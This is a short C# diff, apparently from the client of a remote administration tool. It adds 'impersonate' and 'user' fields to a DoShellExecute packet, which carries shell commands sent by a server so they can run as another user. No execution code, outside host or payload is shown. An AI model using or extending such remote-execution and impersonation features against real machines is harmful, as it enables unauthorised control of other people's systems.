@@ -7,14 +7,18 @@ namespace xClient.Core.Packets.ServerPackets
     public class DoShellExecute : IPacket
     {
         public string Command { get; set; }
+        public bool impersonate { get; set; }
+        public string user { get; set; }
 
         public DoShellExecute()
         {
         }
 
-        public DoShellExecute(string command)
+        public DoShellExecute(string command, bool impersonate = false, string user = null)
         {
             this.Command = command;
+            this.impersonate = impersonate;
+            this.user = user;
         }
 
         public void Execute(Client client)
